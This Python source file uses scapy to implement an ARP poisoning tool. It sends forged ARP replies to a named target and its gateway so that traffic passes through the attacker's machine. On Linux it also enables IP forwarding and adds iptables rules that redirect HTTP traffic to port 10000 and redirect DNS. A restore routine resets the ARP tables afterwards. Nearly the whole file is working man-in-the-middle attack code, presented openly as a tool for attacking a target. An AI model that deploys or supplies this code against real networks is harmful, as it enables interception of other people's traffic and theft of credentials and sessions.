from scapy.all import *
from dataclasses import dataclass
from threading import Thread
from sys import platform
import time
import os

@dataclass
class SpoofingInformation:
    """Class that holds the spoofing information"""
    ip_gateway: str = None
    ip_target: str = None
    mac_gateway: str = None
    mac_target: str = None

class ARPPoisoner:
    """
    ARP Poisoner class
    Creating:
        interface is the interface scrapy needs to use
        ip_target is the ip address of the target we want to attack
        ip_gateway is the gateway between the source and the target
    Starting:
        Just call the start() method
    Stopping:
        Just call the stop() method. Calling this before start() does nothing.
    """
    def __init__(self, interface: str, ip_target: str, ip_gateway: str) -> None:
        self.interface: str = interface
        self.ip_target: str = ip_target
        self.ip_gateway: str = ip_gateway
        self.is_stopped: bool = False
        self.thread: Thread = threading.Thread(target=self.spoof, args=(10,))

    def start(self):
        """Start the thread"""
        self.thread.start()

    def stop(self):
        """This function notifies that the spoof function needs to stop"""
        self.is_stopped = True

    def set_packet_forwarding(self, value: bool) -> None:
        """This function turns on or turns off IP (packet) forwarding depending on the value given"""
        if platform == 'linux' or platform == 'linux2':
            os.system('sysctl -w net.ipv4.ip_forward={}'.format(int(value)))
            os.system(f'iptables -t nat -{"A" if value else "D"} PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
            os.system(f'iptables -t nat -{"A" if value else "D"} PREROUTING -p tcp --destination-port 53 -j REDIRECT')
            os.system(f'iptables -t nat -{"A" if value else "D"} PREROUTING -p udp --destination-port 53 -j REDIRECT')
        elif platform == 'darwin':
            os.system('sysctl -w net.inet.ip.forwarding={}'.format(int(value)))
        elif platform == 'win32':
            # TODO!!!!!
            pass
        else:
            print("Cannot turn on IP forwarding automatically...")

    def get_mac_address(self, ip: str) -> str:
        """Broadcast a packet to all devices on the network to get the mac address corresponding to the ip address"""
        arp_packet: Packet = Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(op = 1, pdst = ip)
        srp_packet = srp(arp_packet, timeout=5, verbose=False, iface=self.interface)
        if len(srp_packet[0]) > 0:
            response: str = srp_packet[0][0][1].hwsrc
            return response
        else:
            print('error broadcasting packet')
            return None

    def get_spoof_packet(self, ip_target: str, mac_target: str, ip_spoof: str) -> Packet:
        """Creates a reply ARP packet"""
        # create packet, opcode = 2 since it needs to be a reply packet
        # pdst = ip address where the packet needs to go
        # hwdst = destination hardware address
        # pssrc = source ip address (let the receiver think that it is coming from this ip address)
        packet: Packet = ARP(op = 2, pdst = ip_target, hwdst = mac_target, psrc = ip_spoof)
        return packet

    def reset(self, si: SpoofingInformation) -> None:
        """Function that sends the correct information to the target and gateway, spoofing is over!"""
        packet1: Packet = ARP(op = 2, pdst = si.ip_target, hwdst = 'ff:ff:ff:ff:ff:ff', psrc = si.ip_gateway, hwsrc = si.mac_gateway)
        packet2: Packet = ARP(op = 2, pdst = si.ip_gateway, hwdst = 'ff:ff:ff:ff:ff:ff', psrc = si.ip_target, hwsrc = si.mac_target)
        send(packet1, count=7, verbose=False)
        send(packet2, count=7, verbose=False)

    def spoof(self, seconds_to_wait: int = 0) -> None:
        """Spoof the target so that it thinks that this computer is the gateway, and spoof the gateway
        so that it thinks that this computer is the target"""

        si: SpoofingInformation = SpoofingInformation(ip_gateway = self.ip_gateway, ip_target = self.ip_target)
        # get the mac addresses of the target and the gateway
        si.mac_target = self.get_mac_address(self.ip_target)
        si.mac_gateway = self.get_mac_address(self.ip_gateway)

        # create the ARP packets to spoof
        packet_for_target: Packet = self.get_spoof_packet(si.ip_target, si.mac_target, si.ip_gateway)
        packet_for_gateway: Packet = self.get_spoof_packet(si.ip_gateway, si.mac_gateway, si.ip_target)

        # turn on packet forwarding
        self.set_packet_forwarding(True)

        while not self.is_stopped:
            # let the target think that this computer is the gateway
            send(packet_for_target, verbose = False)

            # let the gateway think that this computer is the garget
            send(packet_for_gateway, verbose = False)

            # wait for some seconds
            time.sleep(seconds_to_wait)


        # turn off packet forwarding
        self.set_packet_forwarding(False)
        self.reset(si)
